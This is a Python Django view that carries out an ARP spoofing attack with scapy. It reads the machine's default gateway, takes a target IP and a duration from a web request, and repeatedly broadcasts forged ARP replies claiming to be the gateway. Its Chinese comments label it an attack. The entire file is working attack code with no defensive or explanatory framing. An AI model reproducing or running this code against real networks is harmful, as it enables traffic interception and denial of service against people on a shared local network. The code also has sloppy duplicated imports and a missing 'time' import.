from scapy.all import *
import uuid
import json
from django.http import HttpResponse, JsonResponse
from scapy.all import *
import json
import os
import json
from django.http import HttpResponse

def tdt(request):
    global gw
    for line in os.popen("route print"):
        s = line.strip()
        if s.startswith("0.0.0.0"):
            slist = s.split()
            ip = slist[3]
            gw = slist[2]
            break
    print("本机上网的ip是：", ip)
    print("本机上网的网关是：", gw)

    target = request.POST.get("name")
    print(target)
    t = request.POST.get("time")
    print(t)

    # 构造一个欺骗数据包，告诉被攻击者，我是网关
    p1 = Ether(dst='ff:ff:ff:ff:ff:ff', src='14:4f:8a:69:0e:a6') / ARP(pdst=target, psrc=gw)
    # 周期性的发包,欺骗模式
    print("攻击开始。。。")
    for i in range(10 * int(t)):
        sendp(p1, verbose=0)
        time.sleep(0.1)
    print("攻击结束。。。")
    trafficJson = json.dumps("攻击结束")
    return HttpResponse(trafficJson, content_type="application/json")
